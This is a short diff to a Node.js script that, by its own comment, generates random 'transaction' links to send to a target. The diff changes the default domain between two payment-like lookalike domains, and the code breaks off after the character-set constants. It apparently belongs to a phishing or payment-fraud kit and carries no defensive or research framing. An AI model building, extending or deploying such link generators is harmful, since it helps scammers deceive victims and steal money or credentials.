@@ -1,7 +1,7 @@
 // Run: node gen-link.js
 // Generates a random transaction link to send to target
 
-const DOMAIN = process.env.DOMAIN || 'https://opaycash.com';
+const DOMAIN = process.env.DOMAIN || 'https://opayit.com';
 const chars  = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
 const len    = 12;
 
